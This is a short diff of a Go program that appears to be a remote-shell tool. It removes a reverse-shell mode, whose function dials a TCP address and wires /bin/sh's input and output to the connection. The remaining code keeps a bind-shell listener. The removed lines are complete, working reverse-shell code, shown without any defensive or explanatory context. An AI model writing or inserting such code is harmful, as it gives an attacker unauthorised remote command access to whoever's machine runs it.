@@ -25,11 +25,6 @@ func main() {
 		addr := getListenPort(port)
 		bindShell(addr)
 	}
-
-	if listen == false {
-		addr := ip + getListenPort(port)
-		revShell(addr)
-	}
 }
 
 
@@ -69,14 +64,4 @@ func bindShell(addr string) {
 			c.Close()
 		}(conn)
 	}
-}
-
-
-func revShell(addr string) {
-	c, _ := net.Dial("tcp", addr)
-	cmd := exec.Command("/bin/sh")
-	cmd.Stdin = c
-	cmd.Stdout = c
-	cmd.Stderr = c
-	cmd.Run()
 }
